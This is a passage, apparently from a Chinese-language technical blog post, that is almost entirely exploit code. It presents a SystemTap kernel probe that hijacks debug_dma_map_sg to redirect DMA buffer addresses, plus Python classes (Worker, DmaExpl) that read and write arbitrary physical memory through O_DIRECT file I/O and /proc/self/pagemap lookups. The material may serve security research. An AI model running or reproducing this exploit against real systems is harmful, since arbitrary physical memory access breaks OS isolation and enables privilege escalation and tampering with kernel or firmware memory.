= &#x27;&#x27;&#x27;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">global data_len = 0</span><br><span class="line">global verbose = &#x27;&#x27;&#x27; + (&#x27;1&#x27; if VERBOSE else &#x27;0&#x27;) + &#x27;&#x27;&#x27;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># kernel function probe handler</span><br><span class="line">#</span><br><span class="line">probe kernel.function(&quot;debug_dma_map_sg&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    # parse script arguments passed to stap</span><br><span class="line">    phys_addr = strtol(@1, 16);</span><br><span class="line">    target_addr = strtol(@2, 16);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    printf(&quot;%s(%d): %s(): %d\\n&quot;, execname(), pid(), probefunc(), $nents);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    #</span><br><span class="line">    # Each call to sys_write() leads to corresponding call of dma_map_sg(),</span><br><span class="line">    # $sg argument contains list of DMA buffers</span><br><span class="line">    #</span><br><span class="line">    if (verbose != 0)</span><br><span class="line">    &#123;</span><br><span class="line">        for (i = 0; i &lt; $nents; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot; #%d (0x%x): 0x%x\\n&quot;, i, $sg[i]-&gt;length, $sg[i]-&gt;dma_address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    # check for data that came from dma_expl.py os.write() call</span><br><span class="line">    if ($nents &gt; 0 &amp;&amp; $sg[0]-&gt;dma_address == phys_addr)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;[+] DMA request found, changing address to 0x%x\\n&quot;,</span><br><span class="line">               target_addr + data_len);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        # replace addresses of DMA buffers</span><br><span class="line">        for (i = 0; i &lt; $nents; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $sg[i]-&gt;dma_address = target_addr + data_len;</span><br><span class="line">            data_len += $sg[i]-&gt;length;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>


<p>继承<code>threading.Thread</code>的Python类可在后台运行SystemTap脚本并将其输出打印到stdout中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT_PATH = <span class="string">&#x27;/tmp/dma_expl.stp&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Worker</span>(threading.Thread):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, phys_addr, target_addr</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">super</span>(Worker, self).__init__()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self.daemon = <span class="literal">True</span></span><br><span class="line">        self.started = <span class="literal">True</span></span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># drop script file into the /tmp</span></span><br><span class="line">        self.create_file()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># run SystemTap script</span></span><br><span class="line">        self.p = subprocess.Popen([ <span class="string">&#x27;stap&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>, SCRIPT_PATH,</span><br><span class="line">                                  <span class="built_in">hex</span>(phys_addr), <span class="built_in">hex</span>(target_addr) ],</span><br><span class="line">                                  stdout = subprocess.PIPE, stderr = subprocess.PIPE)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># wait for script initialization</span></span><br><span class="line">        <span class="keyword">while</span> self.started:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            line = self.p.stderr.readline()</span><br><span class="line">            sys.stdout.write(line)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># check for pass 5 that indicates sucessfully loaded script</span></span><br><span class="line">            <span class="keyword">elif</span> line.find(<span class="string">&#x27;Pass 5&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;[+] SystemTap script started&#x27;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_file</span>(<span class="params">self</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># save script contents into the file</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(SCRIPT_PATH, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            fd.write(SCRIPT_CODE)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> self.started:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># read and print script output</span></span><br><span class="line">            line = self.p.stdout.readline()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> VERBOSE:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                sys.stdout.write(line)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                self.started = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># check for hijacked DMA request</span></span><br><span class="line">            <span class="keyword">elif</span> line.find(<span class="string">&#x27;[+]&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                self.count += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">self</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">super</span>(Worker, self).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># delay after script start</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self.started:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># delay before script shutdown</span></span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            self.started = <span class="literal">False</span></span><br><span class="line">            os.kill(self.p.pid, signal.SIGINT)</span><br></pre></td></tr></table></figure>


<p>现在，我们需要为磁盘读写分配数据缓冲区，并获取其物理地址。Python具有内置的<a target="_blank" rel="noopener" href="https://docs.python.org/2/library/mmap.html">mmap模块</a>，但是该模块不允许指定分配的内存的虚拟地址。为了解决这个问题，我使用了Clement Rouault在“<a target="_blank" rel="noopener" href="https://blog.hakril.net/articles/1-understanding-python-by-breaking-it---lvl-2.html">Understanding Python by breaking it</a>”文中提到的<a target="_blank" rel="noopener" href="https://docs.python.org/2/library/ctypes.html">ctypes</a>和neat自我检测hack方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PyObj</span>(<span class="title class_ inherited__">Structure</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    _fields_ = [(<span class="string">&quot;ob_refcnt&quot;</span>, c_size_t),</span><br><span class="line">                (<span class="string">&quot;ob_type&quot;</span>, c_void_p)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># ctypes object for introspection</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PyMmap</span>(<span class="title class_ inherited__">PyObj</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    _fields_ = [(<span class="string">&quot;ob_addr&quot;</span>, c_size_t)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># class that inherits mmap.mmap and has the page address</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMap</span>(mmap.mmap):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwarg</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># get the page address by introspection of the native structure</span></span><br><span class="line">        m = PyMmap.from_address(<span class="built_in">id</span>(self))</span><br><span class="line">        self.addr = m.ob_addr</span><br></pre></td></tr></table></figure>

<p>要将获得的虚拟地址转换为物理地址，需使用<code>/proc/self/pagemap</code> Linux伪文件，它可以找出每个虚拟页映射到的物理帧。虚拟内存的每个页面在页面映射中均表示为单个8字节的结构体，其中包含物理内存页面帧号（PFN）和信息标志。<br>下面是利用类，它的构造函数接受要读取&#x2F;写入的物理内存的地址，分配数据缓冲区，获取其物理地址并启动SystemTap脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">PAGE_SIZE = <span class="number">0x1000</span></span><br><span class="line">TEMP_PATH = <span class="string">&#x27;/tmp/dma_expl.tmp&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DmaExpl</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单个 dma_map_sg() 调用期间可以传输的最大数据量</span></span><br><span class="line">    MAX_IO_SIZE = PAGE_SIZE * <span class="number">0x1E</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_addr</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> target_addr &amp; (PAGE_SIZE - <span class="number">1</span>) != <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Address must be aligned by 0x%x&#x27;</span> % PAGE_SIZE)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self.phys_addr = <span class="number">0</span></span><br><span class="line">        self.target_addr = target_addr</span><br><span class="line">        self.libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 分配虚拟数据缓冲区</span></span><br><span class="line">        self.buff = MyMap(-<span class="number">1</span>, self.MAX_IO_SIZE, mmap.PROT_WRITE)</span><br><span class="line">        self.buff.write(<span class="string">&#x27;\x41&#x27;</span> * self.MAX_IO_SIZE)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Memory allocated at 0x%x&#x27;</span> % self.buff.addr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/proc/self/pagemap&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 读取物理地址信息</span></span><br><span class="line">            fd.seek(self.buff.addr / PAGE_SIZE * <span class="number">8</span>)</span><br><span class="line">            phys_info = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, fd.read(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 检查页是否已映射且未交换</span></span><br><span class="line">            <span class="keyword">if</span> phys_info &amp; (<span class="number">1L</span> &lt;&lt; <span class="number">63</span>) == <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&#x27;Page is not present&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> phys_info &amp; (<span class="number">1L</span> &lt;&lt; <span class="number">62</span>) != <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&#x27;Page is swapped out&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 从PFN获取物理地址</span></span><br><span class="line">            self.phys_addr = (phys_info &amp; ((<span class="number">1L</span> &lt;&lt; <span class="number">54</span>) - <span class="number">1</span>)) * PAGE_SIZE</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[+] Physical address is 0x%x&#x27;</span> % self.phys_addr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 在后台线程中运行SystemTap脚本</span></span><br><span class="line">        self.worker = Worker(self.phys_addr, target_addr)</span><br><span class="line">        self.worker.start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self.worker.stop()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>


<p>通过DMA攻击读取任意物理内存的<code>DmaExpl</code>类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DmaExpl</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_dma_read</span>(<span class="params">self, read_size</span>):          </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        count = self.worker.count</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Reading physical memory 0x%x - 0x%x&#x27;</span> % \</span><br><span class="line">              (self.target_addr, self.target_addr + read_size - <span class="number">1</span>)    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># O_DIRECT is needed to write our data to disk immediately</span></span><br><span class="line">        fd = os.<span class="built_in">open</span>(TEMP_PATH, os.O_CREAT | os.O_TRUNC | os.O_RDWR | os.O_DIRECT)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># initiate DMA transaction</span></span><br><span class="line">        <span class="keyword">if</span> self.libc.write(fd, c_void_p(self.buff.addr), read_size) == -<span class="number">1</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            os.close(fd)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;write() fails&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        os.close(fd)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> self.worker.count == count:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># wait untill intercepted debug_dma_map_sg() call</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(TEMP_PATH, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># get readed data</span></span><br><span class="line">            data = fd.read(read_size)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        os.unlink(TEMP_PATH)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self.target_addr += read_size</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, read_size</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> read_size &lt; PAGE_SIZE <span class="keyword">or</span> read_size % PAGE_SIZE != <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Invalid read size&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> read_size &gt; <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="comment"># We can read only MAX_IO_SIZE bytes of physical memory</span></span><br><span class="line">            <span class="comment"># with each os.write() call.</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            size = <span class="built_in">min</span>(read_size, self.MAX_IO_SIZE)</span><br><span class="line">            data += self._dma_read(size)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            read_size -= size</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] DONE&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>


<p>用类似的方法写入物理内存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DmaExpl</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_dma_write</span>(<span class="params">self, data</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        count = self.worker.count</span><br><span class="line">        write_size = <span class="built_in">len</span>(data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Writing physical memory 0x%x - 0x%x&#x27;</span> % \</span><br><span class="line">              (self.target_addr, self.target_addr + write_size - <span class="number">1</span>)    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(TEMP_PATH, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># get readed data</span></span><br><span class="line">            fd.write(data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># O_DIRECT设置需要立即将我们的数据写入磁盘</span></span><br><span class="line">        fd = os.<span class="built_in">open</span>(TEMP_PATH, os.O_RDONLY | os.O_DIRECT)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># initiate DMA transaction</span></span><br><span class="line">        <span class="keyword">if</span> self.libc.read(fd, c_void_p(self.buff.addr), write_size) == -<span class="number">1</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            os.close(fd)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;read() fails&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        os.close(fd)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> self.worker.count == count:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等待直到劫持到debug_dma_map_sg()调用</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        os.unlink(TEMP_PATH)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self.target_addr += write_size</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        ptr = <span class="number">0</span></span><br><span class="line">        write_size = <span class="built_in">len</span>(data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> write_size &lt; PAGE_SIZE <span class="keyword">or</span> write_size % PAGE_SIZE != <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Invalid write size&#x27;</span>)    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> ptr &lt; write_size:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="comment"># We can write only MAX_IO_SIZE bytes of physical memory</span></span><br><span class="line">            <span class="comment"># with each os.read() call.</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            self._dma_write(data[ptr : ptr + self.MAX_IO_SIZE])</span><br><span 